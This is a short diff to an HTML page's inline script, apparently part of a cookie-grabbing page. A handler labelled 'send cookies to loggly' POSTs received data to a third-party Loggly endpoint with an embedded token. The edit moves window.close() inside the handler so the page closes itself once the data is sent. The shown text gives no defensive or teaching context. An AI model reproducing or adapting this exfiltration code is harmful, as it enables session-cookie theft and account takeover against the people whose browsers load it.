@@ -34,14 +34,16 @@ request.onload = function() {
 	  
 	  //send cookies to loggly
 	  post_url = "https://logs-01.loggly.com/inputs/c7c38de9-dd3a-4f12-b288-7b313edcd523/tag/http/"
-	    var xhttp = new XMLHttpRequest();
+	  var xhttp = new XMLHttpRequest();
 	  xhttp.open("POST", post_url, true);
-	xhttp.setRequestHeader('Content-Type', 'text/plain');
-	xhttp.send(e.data);
+	  xhttp.setRequestHeader('Content-Type', 'text/plain');
+	  xhttp.send(e.data);
+		
+	  window.close();
 	};
 }
 
-window.close();
+
 </script>
 </body>
 </html>
